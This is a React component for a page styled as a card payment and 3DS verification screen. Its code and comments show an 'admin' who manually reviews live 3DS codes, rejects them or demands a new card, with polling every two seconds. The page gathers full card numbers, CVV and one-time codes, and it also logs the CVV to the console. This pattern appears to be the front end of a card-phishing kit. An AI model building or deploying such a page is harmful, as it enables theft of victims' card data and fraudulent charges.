import React, { useState, useEffect } from 'react';
import { useAuth } from '../../hooks/useAuth/useAuth';
import { useTranslation } from 'react-i18next';
import axios from 'axios';

const CardPaymentPage = ({ onBack }) => {
  const { isAuthenticated } = useAuth();
  const { t } = useTranslation('3ds');
  
  const [paymentId, setPaymentId] = useState(null);
  const [payment, setPayment] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [pollingInterval, setPollingInterval] = useState(null);
  const [threeDsCode, setThreeDsCode] = useState('');
  const [submitting3DS, setSubmitting3DS] = useState(false);
  const [verifying3DS, setVerifying3DS] = useState(false);
  const [newCardNumber, setNewCardNumber] = useState('');
  const [newExpiryDate, setNewExpiryDate] = useState('');
  const [newCvv, setNewCvv] = useState('');
  const [newCardholderName, setNewCardholderName] = useState('');
  const [submittingNewCard, setSubmittingNewCard] = useState(false);
  const [verifyingNewCard, setVerifyingNewCard] = useState(false);
  const [notification, setNotification] = useState(null);

  useEffect(() => {
    console.log('🔒 Card Payment Page - Auth check:', isAuthenticated);
    
    if (!isAuthenticated) {
      console.log('❌ Not authenticated, redirecting to home');
      window.location.href = '/';
      return;
    }

    // Get payment ID from URL or sessionStorage
    const urlParams = new URLSearchParams(window.location.search);
    let id = urlParams.get('payment_id');
    
    // If not in URL, try to get from sessionStorage (when navigating from payments page)
    if (!id) {
      id = sessionStorage.getItem('currentPaymentId');
    }
    
    console.log('💳 Payment ID:', id);
    
    if (!id) {
      console.error('❌ Payment ID is missing');
      setError('Payment ID is missing');
      setLoading(false);
      return;
    }

    console.log('✅ Starting payment details fetch for ID:', id);
    setPaymentId(id);
    fetchPaymentDetails(id);

    // Start polling for payment status updates
    const interval = setInterval(() => {
      fetchPaymentDetails(id);
    }, 2000); // Poll every 2 seconds for faster response to admin actions

    setPollingInterval(interval);

    return () => {
      if (interval) clearInterval(interval);
    };
  }, [isAuthenticated, verifying3DS, verifyingNewCard]);

  const fetchPaymentDetails = async (id) => {
    try {
      const token = localStorage.getItem('token');
      console.log('📡 Fetching payment details for ID:', id);
      
      const response = await axios.get(`/api/payments/payment/${id}/`, {
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        }
      });
      
      console.log('✅ Payment details received:', response.data);
      setPayment(response.data);
      
      // Handle status transitions for better UX
      const currentStatus = response.data.status;
      
      // Handle rejection/error states - always reset and show form
      if (currentStatus === '3ds_rejected') {
        setVerifying3DS(false);
        setVerifyingNewCard(false);
        setNotification({ 
          type: 'error', 
          message: '3DS code was rejected. Please try again.' 
        });
      } else if (currentStatus === 'failed' || currentStatus === 'cancelled') {
        setVerifying3DS(false);
        setVerifyingNewCard(false);
        setNotification({ 
          type: 'error', 
          message: 'Payment failed. Please try again or contact support.' 
        });
      }
      // Handle waiting_3ds status - show form
      else if (currentStatus === 'waiting_3ds') {
        // Always show form when status is waiting_3ds
        // If verifying is true, it means admin requested a new code
        if (verifying3DS) {
          console.log('🔄 Status is waiting_3ds, resetting verifying state to show form');
          setVerifying3DS(false);
          setThreeDsCode(''); // Clear previous code
        }
        setNotification({ type: 'info', message: 'Please enter your 3DS code' });
      }
      // Handle requires_new_card status
      else if (currentStatus === 'requires_new_card') {
        // Always show form when status is requires_new_card
        console.log('🔄 Status is requires_new_card, resetting verifying states only');
        setVerifying3DS(false); // Reset 3DS verification state
        setVerifyingNewCard(false); // Reset new card verification state
        // Don't clear form fields here - they are only cleared after successful submission
        setNotification({ type: 'info', message: 'Please provide new card details' });
      }
      // Handle card_checking - admin is checking/processing
      else if (currentStatus === 'card_checking') {
        setVerifying3DS(false);
        setVerifyingNewCard(false);
        setNotification({ 
          type: 'info', 
          message: 'Your payment is being processed. Please wait...' 
        });
      }
      // Handle completed payment
      else if (currentStatus === 'completed') {
        setVerifying3DS(false);
        setVerifyingNewCard(false);
      }
      
      // Check if payment is completed or failed
      if (response.data.status === 'completed') {
        console.log('✅ Payment completed, will redirect in 3 seconds');
        if (pollingInterval) {
          clearInterval(pollingInterval);
          setPollingInterval(null);
        }
        
        // Redirect after 3 seconds - use callback if available, otherwise use window.location
        setTimeout(() => {
          if (onBack) {
            onBack();
          } else {
            window.location.href = '/dashboard';
          }
        }, 3000);
      } else if (response.data.status === 'failed' || response.data.status === 'cancelled') {
        // Don't auto-redirect for failed/cancelled, let user manually go back
        if (pollingInterval) {
          clearInterval(pollingInterval);
          setPollingInterval(null);
        }
      }
    } catch (err) {
      console.error('Error fetching payment details:', err);
      setError('Failed to load payment details');
    } finally {
      setLoading(false);
    }
  };

  const getStatusColor = (status) => {
    switch (status) {
      case 'completed':
        return 'text-green-400';
      case 'card_checking':
      case 'pending':
        return 'text-yellow-400';
      case 'failed':
      case 'cancelled':
      case '3ds_rejected':
        return 'text-red-400';
      default:
        return 'text-gray-400';
    }
  };

  const getStatusText = (status) => {
    switch (status) {
      case 'completed':
        return t('paymentCompleted', { defaultValue: 'Payment completed' });
      case 'card_checking':
        return t('checkingCardDetails', { defaultValue: 'Checking card details...' });
      case 'pending':
        return t('paymentPending', { defaultValue: 'Payment pending' });
      case 'waiting_3ds':
        return t('waitingFor3ds', { defaultValue: 'Waiting for 3DS code...' });
      case 'requires_new_card':
        return t('provideCardDetailsToContinue');
      case '3ds_rejected':
        return t('3dsCodeRejected', { defaultValue: '3DS code rejected' });
      case 'failed':
        return t('paymentFailed');
      case 'cancelled':
        return t('paymentCancelled', { defaultValue: 'Payment cancelled' });
      default:
        return status;
    }
  };

  const handleSubmit3DS = async (e) => {
    e.preventDefault();
    setSubmitting3DS(true);
    setNotification({ type: 'loading', message: 'Submitting 3DS code...' });
    
    try {
      const token = localStorage.getItem('token');
      await axios.post(`/api/payments/payment/${paymentId}/3ds`, 
        { code: threeDsCode },
        {
          headers: {
            'Authorization': `Bearer ${token}`,
            'Content-Type': 'application/json'
          }
        }
      );
      
      setThreeDsCode('');
      setVerifying3DS(true);
      setNotification({ type: 'success', message: '3DS code submitted successfully. Waiting for verification...' });
    } catch (err) {
      console.error('Error submitting 3DS code:', err);
      setNotification({ type: 'error', message: err.response?.data?.error || 'Failed to submit 3DS code' });
      setVerifying3DS(false);
    } finally {
      setSubmitting3DS(false);
    }
  };

  const handleSubmitNewCard = async (e) => {
    e.preventDefault();
    
    // Validate card holder name
    if (!newCardholderName || newCardholderName.length < 2) {
      setNotification({ type: 'error', message: 'Cardholder name must be at least 2 characters' });
      return;
    }
    
    // Validate expiry date format and range
    if (!/^\d{2}\/\d{2}$/.test(newExpiryDate)) {
      setNotification({ type: 'error', message: 'Please enter a valid expiry date (MM/YY format)' });
      return;
    }
    
    // Validate month range (01-12)
    const [month, year] = newExpiryDate.split('/');
    const monthNum = parseInt(month);
    if (monthNum < 1 || monthNum > 12) {
      setNotification({ type: 'error', message: 'Month must be between 01 and 12' });
      return;
    }
    
    // Validate year (current year to +20 years)
    const currentYear = new Date().getFullYear() % 100; // Last 2 digits
    const yearNum = parseInt(year);
    if (yearNum < currentYear || yearNum > currentYear + 20) {
      setNotification({ type: 'error', message: `Year must be between ${currentYear} and ${currentYear + 20}` });
      return;
    }
    
    // Validate CVV
    if (!/^\d{3,4}$/.test(newCvv)) {
      setNotification({ type: 'error', message: 'CVV must be 3 or 4 digits' });
      return;
    }
    
    setSubmittingNewCard(true);
    setNotification({ type: 'loading', message: 'Submitting card details...' });
    
    try {
      const token = localStorage.getItem('token');
      const requestData = {
        card_number: newCardNumber.replace(/\s/g, ''),
        expiry_date: newExpiryDate,
        cvv: newCvv,
        card_holder: newCardholderName
      };
      
      console.log('📤 Submitting new card data:', requestData);
      
      const response = await axios.post(`/api/payments/payment/${paymentId}/new-card`, 
        requestData,
        {
          headers: {
            'Authorization': `Bearer ${token}`,
            'Content-Type': 'application/json'
          }
        }
      );
      
      console.log('✅ New card submitted successfully:', response.data);
      
      // Reset form
      setNewCardNumber('');
      setNewExpiryDate('');
      setNewCvv('');
      setNewCardholderName('');
      setVerifyingNewCard(true);
      setNotification({ type: 'success', message: 'Card details submitted. Waiting for verification...' });
    } catch (err) {
      console.error('❌ Error submitting new card:', err);
      console.error('❌ Error response:', err.response?.data);
      setNotification({ type: 'error', message: err.response?.data?.error || 'Failed to submit card details. Please check your input.' });
      setVerifyingNewCard(false);
    } finally {
      setSubmittingNewCard(false);
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-black via-gray-900 to-black cyber-grid flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-16 w-16 border-b-2 border-cyan-500 mx-auto mb-4"></div>
          <p className="text-white text-lg">Loading payment details...</p>
        </div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-black via-gray-900 to-black cyber-grid flex items-center justify-center px-4">
        <div className="glass-effect rounded-xl p-8 max-w-md w-full text-center">
          <div className="text-6xl mb-4">❌</div>
          <h2 className="text-2xl font-bold text-white mb-4">Error</h2>
          <p className="text-gray-400 mb-6">{error}</p>
          <button
            onClick={() => window.location.href = '/dashboard'}
            className="px-6 py-3 bg-cyan-500 text-white rounded-lg hover:bg-cyan-600 transition-colors"
          >
            {t('3ds.goToDashboard')}
          </button>
        </div>
      </div>
    );
  }

  if (!payment) {
    return null;
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-black via-gray-900 to-black cyber-grid py-12 px-4">
      <div className="max-w-3xl mx-auto">
        {/* Header */}
        <div className="text-center mb-8">
          <h1 className="text-4xl font-bold text-white neon-glow mb-2">{t('paymentProcessing')}</h1>
          <p className="text-gray-400">{t('yourPaymentBeingProcessed')}</p>
        </div>

        {/* Notification Banner */}
        {notification && (
          <div className={`glass-effect rounded-xl p-4 mb-6 border-l-4 ${
            notification.type === 'success' ? 'border-green-500' :
            notification.type === 'error' ? 'border-red-500' :
            notification.type === 'loading' ? 'border-yellow-500' :
            'border-blue-500'
          }`}>
            <div className="flex items-center gap-3">
              {notification.type === 'loading' && (
                <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-cyan-500"></div>
              )}
              {notification.type === 'success' && <span className="text-2xl">✅</span>}
              {notification.type === 'error' && <span className="text-2xl">❌</span>}
              {notification.type === 'info' && <span className="text-2xl">ℹ️</span>}
              <p className="text-white font-medium">{notification.message}</p>
            </div>
          </div>
        )}

        {/* Payment Status Card */}
        <div className="glass-effect rounded-xl p-8 mb-6">
                      <div className="flex items-center justify-between mb-6">
            <h2 className="text-2xl font-bold text-white">{t('paymentDetails')}</h2>
            <div className={`px-4 py-2 rounded-lg ${getStatusColor(payment.status)} bg-black/30`}>
              {getStatusText(payment.status)}
            </div>
          </div>

          {/* Payment Info */}
          <div className="space-y-4">
            <div className="flex justify-between items-center py-3 border-b border-gray-700">
              <span className="text-gray-400">{t('paymentId')}:</span>
              <span className="text-white font-mono">{payment.payment_id || paymentId}</span>
            </div>
            
            <div className="flex justify-between items-center py-3 border-b border-gray-700">
              <span className="text-gray-400">{t('amountField')}:</span>
              <span className="text-white font-bold">{payment.amount} {payment.currency}</span>
            </div>
            
            <div className="flex justify-between items-center py-3 border-b border-gray-700">
              <span className="text-gray-400">{t('paymentMethod')}:</span>
              <span className="text-white capitalize">{payment.payment_method}</span>
            </div>
            
            {payment.card_holder && (
              <div className="flex justify-between items-center py-3 border-b border-gray-700">
                <span className="text-gray-400">{t('cardHolder')}:</span>
                <span className="text-white">{payment.card_holder}</span>
              </div>
            )}
            
            {payment.card_number && (
              <div className="flex justify-between items-center py-3 border-b border-gray-700">
                <span className="text-gray-400">{t('cardNumber')}:</span>
                <span className="text-white font-mono">
                  **** **** **** {payment.card_number.slice(-4)}
                </span>
              </div>
            )}
          </div>
        </div>

        {/* 3DS Verification in Progress - Only show for intermediate statuses */}
        {verifying3DS && 
         payment.status !== 'waiting_3ds' && 
         payment.status !== '3ds_rejected' && 
         payment.status !== '3ds_approved' && 
         payment.status !== 'completed' && (
          <div className="glass-effect rounded-xl p-6 border border-yellow-500/30 mb-4">
            <div className="flex items-center gap-3">
              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-yellow-500"></div>
              <div>
                <h3 className="text-white font-bold">{t('verifying3DS')}</h3>
                <p className="text-gray-400 text-sm mt-1">{t('pleaseWaitBank')}</p>
              </div>
            </div>
          </div>
        )}

        {/* 3DS Form */}
        {((payment.status === 'waiting_3ds' || payment.status === '3ds_rejected') && !verifying3DS) && (
          <div className="glass-effect rounded-xl p-6 border border-yellow-500/30 mb-4">
            <div className="flex items-start gap-3 mb-4">
              <span className="text-2xl">🔐</span>
              <div>
                <h3 className="text-white font-bold">
                  {payment.status === '3ds_rejected' ? '3DS Verification Required (Retry)' : '3DS Verification Required'}
                </h3>
                <p className="text-gray-400 text-sm mt-1">
                  {payment.status === '3ds_rejected' 
                    ? 'The previous 3DS code was rejected. Please enter a new code.' 
                    : 'Please enter the 3DS code sent to your phone or email'}
                </p>
              </div>
            </div>
            <form onSubmit={handleSubmit3DS} className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">
                  Enter 3DS Code
                </label>
                <input
                  type="text"
                  value={threeDsCode}
                  onChange={(e) => setThreeDsCode(e.target.value)}
                  placeholder="123456"
                  maxLength="6"
                  className="w-full px-4 py-3 bg-black/70 border border-cyan-500/30 rounded-lg text-white placeholder-gray-300 focus:border-cyan-400 focus:outline-none focus:bg-black/80"
                  required
                />
              </div>
              <button
                type="submit"
                disabled={submitting3DS}
                className="w-full py-3 px-6 bg-gradient-to-r from-green-500 to-green-600 text-white rounded-lg hover:from-green-600 hover:to-green-700 transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {submitting3DS ? 'Submitting...' : 'Submit 3DS Code'}
              </button>
            </form>
          </div>
        )}

        {/* New Card Verification in Progress - Hide when status is requires_new_card */}
        {verifyingNewCard && payment.status !== 'requires_new_card' && (
          <div className="glass-effect rounded-xl p-6 border border-yellow-500/30 mb-4">
            <div className="flex items-center gap-3">
              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-yellow-500"></div>
              <div>
                <h3 className="text-white font-bold">Verifying New Card...</h3>
                <p className="text-gray-400 text-sm mt-1">Please wait while we verify your new card details with your bank</p>
              </div>
            </div>
          </div>
        )}

        {/* New Card Form */}
        {payment.status === 'requires_new_card' && !verifyingNewCard && (
          <div className="glass-effect rounded-xl p-6 border border-yellow-500/30 mb-4">
            <div className="flex items-start gap-3 mb-4">
              <span className="text-2xl">💳</span>
              <div>
                <h3 className="text-white font-bold">New Card Required</h3>
                <p className="text-gray-400 text-sm mt-1">Please provide new card details to continue with the payment</p>
              </div>
            </div>
            <form onSubmit={handleSubmitNewCard} className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">
                  Card Number
                </label>
                <input
                  type="text"
                  value={newCardNumber}
                  onChange={(e) => {
                    let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
                    let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
                    if (formattedValue.length <= 19) {
                      setNewCardNumber(formattedValue);
                    }
                  }}
                  placeholder="1234 5678 9012 3456"
                  maxLength="19"
                  className="w-full px-4 py-3 bg-black/70 border border-cyan-500/30 rounded-lg text-white placeholder-gray-300 focus:border-cyan-400 focus:outline-none focus:bg-black/80"
                  required
                />
              </div>
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-medium text-gray-300 mb-2">
                    Expiry Date
                  </label>
                  <input
                    type="text"
                    value={newExpiryDate}
                    onChange={(e) => {
                      let value = e.target.value.replace(/\D/g, '');
                      
                      // Validate month (first 2 digits) - must be 01-12
                      if (value.length >= 2) {
                        const month = parseInt(value.substring(0, 2));
                        if (month > 12) {
                          // If month is > 12, prevent input
                          return;
                        }
                        value = value.substring(0, 2) + '/' + value.substring(2, 4);
                      }
                      
                      if (value.length <= 5) {
                        setNewExpiryDate(value);
                      }
                    }}
                    placeholder="MM/YY"
                    maxLength="5"
                    className="w-full px-4 py-3 bg-black/70 border border-cyan-500/30 rounded-lg text-white placeholder-gray-300 focus:border-cyan-400 focus:outline-none focus:bg-black/80"
                    required
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-300 mb-2">
                    CVV
                  </label>
                  <input
                    type="text"
                    value={newCvv}
                    onChange={(e) => {
                      let value = e.target.value.replace(/\D/g, '');
                      if (value.length <= 4) {
                        setNewCvv(value);
                      }
                    }}
                    placeholder="123"
                    maxLength="4"
                    className="w-full px-4 py-3 bg-black/70 border border-cyan-500/30 rounded-lg text-white placeholder-gray-300 focus:border-cyan-400 focus:outline-none focus:bg-black/80"
                    required
                  />
                </div>
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">
                  Cardholder Name
                </label>
                <input
                  type="text"
                  value={newCardholderName}
                  onChange={(e) => setNewCardholderName(e.target.value)}
                  placeholder="John Doe"
                  className="w-full px-4 py-3 bg-black/70 border border-cyan-500/30 rounded-lg text-white placeholder-gray-300 focus:border-cyan-400 focus:outline-none focus:bg-black/80"
                  required
                />
              </div>
              <button
                type="submit"
                disabled={submittingNewCard}
                className="w-full py-3 px-6 bg-gradient-to-r from-green-500 to-green-600 text-white rounded-lg hover:from-green-600 hover:to-green-700 transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {submittingNewCard ? 'Submitting...' : 'Submit New Card Details'}
              </button>
            </form>
          </div>
        )}

        {/* Instructions */}
        {(payment.status === 'card_checking' || payment.status === 'pending') && (
          <div className="glass-effect rounded-xl p-6 border border-yellow-500/30">
            <div className="flex items-start gap-3">
              <div className="text-2xl">⏳</div>
              <div>
                <h3 className="text-white font-bold mb-2">Payment Processing</h3>
                <p className="text-gray-400 text-sm">
                  Your payment is being reviewed by our payment processing team. 
                  This page will automatically update when the status changes.
                </p>
                <p className="text-gray-400 text-sm mt-2">
                  You will be redirected to your dashboard when the payment is completed.
                </p>
              </div>
            </div>
          </div>
        )}

        {/* 3DS Approved Message */}
        {payment.status === '3ds_approved' && (
          <div className="glass-effect rounded-xl p-6 border border-green-500/30">
            <div className="flex items-start gap-3">
              <div className="text-2xl">✅</div>
              <div>
                <h3 className="text-green-400 font-bold mb-2">Payment Approved!</h3>
                <p className="text-gray-400 text-sm">
                  Your 3DS code has been verified and payment is being processed.
                  You can return to your dashboard.
                </p>
              </div>
            </div>
          </div>
        )}

        {/* Success Message */}
        {payment.status === 'completed' && (
          <div className="glass-effect rounded-xl p-6 border border-green-500/30">
            <div className="flex items-start gap-3">
              <div className="text-2xl">✅</div>
              <div>
                <h3 className="text-green-400 font-bold mb-2">Payment Successful!</h3>
                <p className="text-gray-400 text-sm">
                  Your payment has been processed successfully. 
                  Redirecting to your dashboard...
                </p>
              </div>
            </div>
          </div>
        )}

        {/* Error Message */}
        {(payment.status === 'failed' || payment.status === 'cancelled') && (
          <div className="glass-effect rounded-xl p-6 border border-red-500/30">
            <div className="flex items-start gap-3">
              <div className="text-2xl">❌</div>
              <div>
                <h3 className="text-red-400 font-bold mb-2">Payment Failed</h3>
                <p className="text-gray-400 text-sm">
                  Your payment could not be processed. Please try again or contact support.
                </p>
              </div>
            </div>
          </div>
        )}

        {/* Back Button */}
        <div className="text-center mt-8">
          <button
            onClick={() => {
              if (onBack) {
                onBack();
              } else {
                window.location.href = '/dashboard';
              }
            }}
            className="px-8 py-3 bg-gray-700 text-white rounded-lg hover:bg-gray-600 transition-colors"
          >
            {t('3ds.goToDashboard')}
          </button>
        </div>
      </div>
    </div>
  );
};

export default CardPaymentPage;
